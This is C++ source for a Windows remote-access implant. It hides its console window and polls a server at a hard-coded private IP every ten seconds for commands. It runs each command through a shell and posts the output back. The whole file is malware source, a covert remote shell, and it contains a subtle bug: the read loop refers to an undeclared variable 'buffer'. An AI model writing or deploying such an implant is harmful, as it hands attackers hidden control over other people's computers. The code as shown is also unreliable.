#define WIN32_LEAN_AND_MEAN // this stops windows from loading hundred of unncessary old functions
#include<windows.h>
#include<string>
#include<iostream>
#include<direct.h>

// #define CPPHTTPLIB_OPENSSL_SUPPORT
#include "httplib.h"

using namespace std;


string exe_command(const string& cmd) {
    //Intercept cd command
    if(cmd.rfind("cd", 0) == 0 ) {
        string path = cmd.substr(3); //Extract the path after cd

        while(!path.empty() && 
                (path.back() == ' ' || path.back() == '\n' || path.back() == '\r'))
            {
                path.pop_back();
        }

        if(_chdir(path.c_str())==0) {
            return " Success : Changed Directory to " + path + "\n";
        }
        else {
            return " Error : Could not change directory " ;
        } 
    }

    string result;

    char space[128];

    //redirect stderr to stdout so _popen can read it
    //"2>&1" to fgets catches both
    std::string redirected_cmd=cmd + " 2>&1";

    FILE* pipe = _popen(redirected_cmd.c_str(), "r");

    if(!pipe) {
        return "leeeeeeeee " ;
    }

    while(fgets(space, sizeof(space), pipe) != nullptr){
        result += buffer;
    }
    _pclose(pipe);

    if(result.empty()){
        return " Sucess ";
    }
    return result;

};



void beacon_loop(const char* server_ip, int port) {


    string server_url = "http://" + string(server_ip) + ":" + to_string(port);
    httplib::Client cli(server_url);

    //Set communication timeout

    cli.set_connection_timeout(5, 0); // 5 seconds maximum to attempt connection
    cli.set_read_timeout(6, 0); //6 seconds maxium to wait for data aback

    while(true) {
       

        // Send an HTTP get request to hidden endpoint
        auto res = cli.Get("/getsnack");

        // Verify Connection
        if( res && res->status == 200) {

            //Extract the plain text payload sent by the server
            string command = res->body;

            //if the server told us NOP , do nothing and skip to the sleep interval
            if(command != "NOP" && !command.empty()) {
                string output = exe_command(command);

                // 3. Send an HTTP POST request back to the server with the terminal output
                // The third parameter "text/plain" matches what our server expects in its req.body
                auto post_res = cli.Post("/givesnack", output, "text/plain");
            }
        }
        else {
            Sleep(10000);
        }
         // Sleep 10 seconds before trying to reconnect 
        Sleep(10000); 

    }

}

int main() {
    HWND windowHandle = GetConsoleWindow();
    if(windowHandle != NULL) {
        ShowWindow(windowHandle, SW_HIDE);
    }

    // Call  HTTP-driven infinite loop
    // Directing traffic to my public agent listening server port (6060)
    beacon_loop("192.168.100.245", 6060);
}

